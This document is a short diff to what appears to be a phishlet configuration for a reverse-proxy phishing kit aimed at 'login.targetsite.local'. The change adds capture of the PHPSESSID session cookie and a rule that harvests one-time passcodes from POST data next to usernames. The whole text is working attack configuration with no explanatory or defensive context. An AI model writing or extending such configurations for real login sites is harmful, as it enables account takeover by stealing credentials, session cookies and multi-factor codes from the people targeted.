@@ -8,8 +8,12 @@ sub_filters:
   - {triggers_on: 'login.targetsite.local', orig_sub: 'login', domain: 'targetsite.local', search: 'https://{hostname}/index.php', replace: 'https://{hostname}/index.php', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
 auth_tokens:
   - domain: 'login.targetsite.local'
-    keys: ['session_token']
+    keys: ['session_token', 'PHPSESSID']
 credentials:
+  otp:
+    key: 'otp'  
+    search: '(.*)'
+    type: 'post'
   username:
     key: 'username'
     search: '(.*)'
